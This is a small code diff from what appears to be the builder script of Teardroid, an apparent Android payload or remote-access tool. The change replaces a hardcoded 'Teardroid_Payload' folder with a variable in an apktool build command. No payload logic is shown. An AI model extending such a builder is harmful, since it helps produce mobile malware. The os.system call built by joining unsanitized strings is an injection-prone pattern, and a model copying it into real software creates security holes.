@@ -79,7 +79,7 @@ def builder(name: str) -> None:
         APKTOOL = os.path.join(os.getcwd(), "apktool.sh")
     else:
         APKTOOL = os.path.join(os.getcwd(), "apktool.bat")
-    os.system(APKTOOL + " b Teardroid_Payload -o " +
+    os.system(APKTOOL + " b "+Teardroid.source_folder+" -o " +
               name + "_uncompressed.apk")
     Teardroid.print_result("Compiling Teardroid completed")
     Teardroid.print_result("Compressing APK Files using zipalign")
